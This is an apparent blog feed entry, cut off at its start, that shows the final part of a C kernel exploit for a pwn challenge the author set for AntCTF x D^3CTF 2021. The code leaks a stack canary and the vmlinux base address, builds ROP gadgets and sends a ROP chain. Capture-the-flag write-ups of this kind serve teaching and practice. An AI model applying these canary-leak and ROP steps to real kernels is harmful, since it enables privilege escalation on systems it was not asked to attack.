&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] received rcv[%d]: 0x%llx\n&quot;</span>, i, rcv[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    canary = rcv[<span class="number">32</span>];</span><br><span class="line">    vmlinux_base = rcv[<span class="number">52</span>] - <span class="number">0x20007c</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] leak canary: 0x%llx\n&quot;</span>, canary);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] leak vmlinux_base: 0x%llx\n&quot;</span>, vmlinux_base+<span class="number">0x401160</span>);</span><br><span class="line"></span><br><span class="line">    gadgets_generator();</span><br><span class="line"></span><br><span class="line">    reset();</span><br><span class="line">    choose(<span class="number">0</span>);</span><br><span class="line">    cast((<span class="keyword">u_int8_t</span> *)rop, m*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;em&gt;I am honored to be one of the questioners of &lt;code&gt;AntCTF x D^3CTF 2021&lt;/code&gt;.&lt;br&gt;In this competition, I came up with 2 pwnable chal</summary>
      
    
    
    
    
  </entry>
  
</feed>
